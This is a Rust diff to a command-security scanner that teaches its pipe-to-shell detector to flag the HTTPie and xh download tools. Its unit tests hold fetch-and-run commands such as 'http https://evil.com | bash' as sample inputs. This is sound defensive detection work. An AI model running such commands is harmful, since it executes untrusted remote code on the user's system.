@@ -140,6 +140,8 @@ fn check_pipe_to_interpreter(segments: &[tokenize::Segment], findings: &mut Vec<
                         let rule_id = match source_base.as_str() {
                             "curl" => RuleId::CurlPipeShell,
                             "wget" => RuleId::WgetPipeShell,
+                            "http" | "https" => RuleId::HttpiePipeShell,
+                            "xh" => RuleId::XhPipeShell,
                             _ => RuleId::PipeToInterpreter,
                         };
 
@@ -235,6 +237,9 @@ fn is_source_command(cmd: &str) -> bool {
             | "fetch"
             | "scp"
             | "rsync"
+            | "http"
+            | "https"
+            | "xh"
             | "iwr"
             | "irm"
             | "invoke-webrequest"
@@ -347,6 +352,33 @@ mod tests {
                 .iter()
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through env -S bash -x"
+        );
+    }
+
+    #[test]
+    fn test_httpie_pipe_shell_detected() {
+        let findings = check("http https://evil.com | bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::HttpiePipeShell),
+            "should detect HTTPie http pipe to shell"
+        );
+    }
+
+    #[test]
+    fn test_httpie_https_pipe_shell_detected() {
+        let findings = check("https https://evil.com | sh", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::HttpiePipeShell),
+            "should detect HTTPie https pipe to shell"
+        );
+    }
+
+    #[test]
+    fn test_xh_pipe_shell_detected() {
+        let findings = check("xh https://evil.com | bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
+            "should detect xh pipe to shell"
         );
     }
 
